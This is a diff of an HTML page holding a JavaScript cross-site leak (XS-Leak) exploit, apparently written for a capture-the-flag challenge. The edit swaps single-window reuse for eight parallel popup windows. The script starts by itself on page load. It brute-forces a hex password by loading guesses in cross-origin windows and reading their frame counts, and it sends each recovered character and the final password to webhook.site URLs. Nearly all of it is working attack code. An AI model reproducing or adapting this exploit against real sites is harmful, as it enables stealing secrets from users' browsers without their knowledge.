@@ -1,137 +1,117 @@
 <!DOCTYPE html>
 <html>
-<head><title>Window Reuse XS-Leak</title></head>
+<head><title>8 Parallel Windows</title></head>
 <body>
-<h1>XS-Leak - Window Reuse Technique</h1>
+<h1>Ultra-Fast: 8 Parallel Windows</h1>
 <pre id="output"></pre>
 <script>
 const TARGET = 'https://127.0.0.1:9999/';
-const WEBHOOK = 'https://webhook.site/604a832e-fcc1-4774-a4a6-d91de8af9944/';
+const WEBHOOK = 'https://webhook.site/b63baddd-e909-4127-81ca-f44ebc0e04b9';
 const CHARSET = '0123456789abcdef';
 
 function log(msg) {
     document.getElementById('output').textContent += msg + '\n';
-    console.log(msg);
 }
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-const waitFor = async (f, timeout = 5000) => {
+const waitFor = async (f, timeout = 2000) => {
     const start = Date.now();
     while (true) {
         if (await f()) return true;
         if (Date.now() - start > timeout) return false;
-        await sleep(10);
+        await sleep(5);
     }
 };
 
-// Open window ONCE and reuse it
-const win = window.open('about:blank');
-if (!win) {
-    alert('Popup blocked! Please allow popups and refresh.');
+// Open 8 windows (test full 16-char in 2 batches)
+const windows = [];
+for (let i = 0; i < 8; i++) {
+    windows.push(window.open('about:blank'));
+}
+
+if (windows.some(w => !w)) {
+    alert('Popup blocked! Allow popups and refresh.');
     throw new Error('Popup blocked');
 }
 
-async function check(candidate) {
+log(`✅ Opened ${windows.length} windows\n`);
+
+async function checkWithWindow(win, candidate) {
     try {
-        // Navigate the SAME window to about:blank first
         win.location = 'about:blank';
-        await waitFor(() => win.length === 0, 2000);
-        await sleep(100);
+        await waitFor(() => win.length === 0, 700);
+        await sleep(20);
         
-        // Navigate to target URL
-        const url = TARGET + '?pass=' + encodeURIComponent(candidate);
-        win.location = url;
+        win.location = TARGET + '?pass=' + encodeURIComponent(candidate);
         
-        // Wait for cross-origin error (page loaded)
         await waitFor(() => {
-            try {
-                win.origin;
-                return false;
-            } catch {
-                return true;
-            }
-        }, 3000);
+            try { win.origin; return false; } catch { return true; }
+        }, 1200);
         
-        // Wait a bit for iframe to render if it exists
-        await sleep(200);
-        
-        // Check frame count
-        try {
-            const frameCount = win.length;
-            return frameCount > 0;
-        } catch (e) {
-            log(`  Error reading win.length: ${e.message}`);
-            return false;
-        }
+        await sleep(60);
+        return win.length > 0;
     } catch (e) {
-        log(`  Error in check: ${e.message}`);
         return false;
     }
 }
 
-async function start() {
-    log('Starting exploit with window reuse technique...\n');
+async function testBatch(known, startIdx) {
+    const batch = [];
+    const promises = [];
     
-    fetch(WEBHOOK + '?status=reuse_started').catch(e=>{});
-    
-    // Verify oracle
-    log('[*] Verifying oracle...');
-    const good = await check('lebah');
-    log(`  "lebah": ${good} (should be true)`);
-    
-    const bad = await check('lebahZ');
-    log(`  "lebahZ": ${bad} (should be false)\n`);
-    
-    if (!good || bad) {
-        log('❌ Oracle failed!');
-        fetch(WEBHOOK + '?error=oracle_failed').catch(e=>{});
-        return;
+    for (let i = 0; i < 8 && (startIdx + i) < CHARSET.length; i++) {
+        const c = CHARSET[startIdx + i];
+        batch.push(c);
+        promises.push(checkWithWindow(windows[i], known + c));
     }
     
-    log('✅ Oracle working!\n');
+    log(`  [${batch.join(' ')}]`);
+    const results = await Promise.all(promises);
     
-    let known = 'lebah2';
+    for (let i = 0; i < results.length; i++) {
+        if (results[i]) {
+            return batch[i];
+        }
+    }
+    return null;
+}
+
+async function start() {
+    log('8-WINDOW PARALLEL ATTACK\n');
     
-    // Leak 12 hex chars
+    fetch(WEBHOOK + '?status=8win_started').catch(e=>{});
+    
+    let known = 'lebah';
+    
     for (let pos = 0; pos < 12; pos++) {
-        log(`[*] Position ${pos+1}/12...`);
+        log(`[${pos+1}/12]`);
         let found = false;
         
-        for (let c of CHARSET) {
-            const candidate = known + c;
-            const match = await check(candidate);
-            log(`  "${c}": ${match ? '✓' : '✗'}`);
-            
-            if (match) {
-                known = candidate;
-                log(`\n✅ Found: ${known}\n`);
-                fetch(WEBHOOK + '?progress=' + known).catch(e=>{});
+        // Only 2 batches needed (8 chars per batch, 16 total)
+        for (let i = 0; i < CHARSET.length; i += 8) {
+            const char = await testBatch(known, i);
+            if (char) {
+                known += char;
+                log(`✅ '${char}' -> ${known}\n`);
+                fetch(WEBHOOK + '?p=' + known).catch(e=>{});
                 found = true;
                 break;
             }
         }
         
-        if (!found) {
-            log('\n❌ No match found!');
-            break;
-        }
+        if (!found) break;
     }
     
-    log('\n========================================');
-    log('PASSWORD: ' + known);
-    log('========================================');
+    log(`\n${'='.repeat(40)}`);
+    log(`PASSWORD: ${known}`);
+    log('='.repeat(40));
     fetch(WEBHOOK + '?PASSWORD=' + known).catch(e=>{});
     
-    // Close the reused window
-    if (win && !win.closed) {
-        win.close();
-    }
+    windows.forEach(w => { if (w && !w.closed) w.close(); });
 }
 
-log('Auto-starting exploit...\n');
-
-// Auto-start after page loads
+log('Starting in 500ms...\n');
 setTimeout(start, 500);
 </script>
 </body>
